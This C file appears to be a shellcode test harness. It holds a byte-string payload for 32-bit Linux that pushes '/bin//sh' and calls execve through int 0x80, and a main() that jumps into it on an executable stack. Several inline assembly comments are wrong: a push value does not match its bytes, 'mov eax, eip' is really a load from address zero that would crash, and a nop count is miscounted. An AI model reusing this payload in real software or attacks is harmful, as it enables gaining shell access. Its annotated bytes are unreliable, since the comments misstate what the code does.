// gcc -z execstack -o shellcode shellcode.c

/*
char shellcode[] = "\x31\xc0"
                   "\x50"
                   "\x89\xe3"
                   "\x89\xc1"
                   "\x89\xc2"
                   "\xb0\x0b"
                   "\xcd\x80"
                   "\x31\xc0"
                   "\x40"
                   "\xcd\x80";
*/

char shellcode[] = "\x31\xc0"			// xor eax, eax
                   "\x50"			// push eax
                   "\x68\x2f\x2f\x73\x68"	// push 0x78732f2f
                   "\x90\x90\x90"		// nop; nop -- alignement
                   "\xa1\x00\x00\x00\x00"	// mov eax, eip
                   "\x31\xc0"			// xor eax, eax
                   "\x68\x2f\x62\x69\x6e"	// push 0x6e69622f
                   "\x89\xe3"			// mov ebx, esp
                   "\x89\xc1"			// mov ecx, eax
                   "\xa1\x00\x00\x00\x00"	// mov eax, eip
                   "\x31\xc0"			// xor eax, eax
                   "\x89\xc2"			// mov edx, eax
                   "\xb0\x0b"			// mov al, 0xb
                   "\xcd\x80"			// int 0x80
                   "\x90\x90\x90\x90"		// nop; nop; nop; nop --alignement
                   "\xa1\x00\x00\x00\x00"	// mov eax, eip
                   "\x31\xc0"			// xor eax, eax
                   "\x40"			// inc eax
                   "\xcd\x80";			// int 0x80


int main() {
	(*(void(*)()) shellcode)();
	return 0;
}
